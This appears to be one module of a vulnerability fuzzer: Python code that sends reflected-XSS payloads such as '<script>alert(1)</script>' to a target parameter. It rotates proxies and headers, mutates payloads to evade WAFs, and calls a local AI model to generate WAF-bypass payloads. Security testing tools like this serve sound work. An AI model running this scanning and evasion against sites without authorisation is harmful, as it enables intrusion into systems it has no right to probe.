# modules/xss.py
import os
import logging
import asyncio
import aiohttp
from typing import List, Dict, Any, Tuple
from modules.base import BaseModule
import config

logger = logging.getLogger("water_fuzzer.xss")

class CrossSiteScriptingModule(BaseModule):
    """Modul Reflected XSS V10.1 Asinkronus (AI-Driven Evidence Framework)."""

    def load_payloads(self) -> List[str]:
        payload_file = os.path.join(config.BASE_DIR, "payloads", "xss.txt")
        if os.path.exists(payload_file):
            try:
                with open(payload_file, "r", encoding="utf-8") as f:
                    return [line.strip() for line in f if line.strip() and not line.startswith("#")]
            except IOError as e:
                logger.error(f"Gagal membaca payloads XSS: {str(e)}")
        return ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]

    async def execute_and_evaluate(self, session: aiohttp.ClientSession, payload: str, headers: dict) -> Tuple[bool, bool]:
        try:
            if self.auditor.method == "POST":
                async with session.post(self.auditor.target_url, data={self.auditor.parameter: payload}, headers=headers, timeout=self.auditor.timeout, proxy=self.auditor._get_random_proxy()) as res:
                    body = await res.text(); status = res.status
            else:
                async with session.get(self.auditor.target_url, params={self.auditor.parameter: payload}, headers=headers, timeout=self.auditor.timeout, proxy=self.auditor._get_random_proxy()) as res:
                    body = await res.text(); status = res.status

            if status in [403, 409, 429] or "waf" in body.lower() or "blocked" in body.lower():
                return False, True

            indicators = []
            current_entropy = self.auditor.calculate_content_entropy(body)
            entropy_delta = abs(current_entropy - self.auditor.baseline["entropy_score"])
            
            module_specific = {"vulnerability_proof_concept": "HTML Context Echo Execution", "reflected_raw_payload": payload, "is_tags_escaped_or_filtered": True}

            if payload in body:
                indicators.extend(["anomalous_output", "consistent_evaluation_proof"])
                module_specific["is_tags_escaped_or_filtered"] = False

            if len(body) != self.auditor.baseline["content_length"]: indicators.append("response_diff")
            if entropy_delta > 0.5: indicators.append("entropy_deviation")

            if indicators:
                self.auditor.evaluate_heuristic_evidence(body, status, 0.05, payload, indicators, "XSS_REFLECTED", module_specific)
                return True, False
        except Exception: pass
        return False, False

    async def run_audit(self, session: aiohttp.ClientSession) -> bool:
        print("[*] Menjalankan Modul V10.1: Reflected XSS (AI-Driven)...")
        headers = self.auditor._get_random_headers()
        payloads = self.load_payloads()
        found_any_vuln = False

        for base_payload in payloads:
            for strategy in range(4):
                payload = self.auditor.mutate_payload_for_waf(base_payload, strategy)
                success, trigger_ai = await self.execute_and_evaluate(session, payload, headers)
                if success: found_any_vuln = True; break
                if trigger_ai:
                    print(f"[\033[1;31m!\033[0m] Proteksi WAF Terdeteksi! Memicu Pipa Pemikiran AI Lokal...")
                    ai_payload = await self.auditor.ask_local_ai_to_bypass_waf(session, base_payload, "WAF_BLOCK_DETECTED")
                    if ai_payload:
                        success_ai, _ = await self.execute_and_evaluate(session, ai_payload, headers)
                        if success_ai: found_any_vuln = True; break
            if found_any_vuln: break
        return found_any_vuln
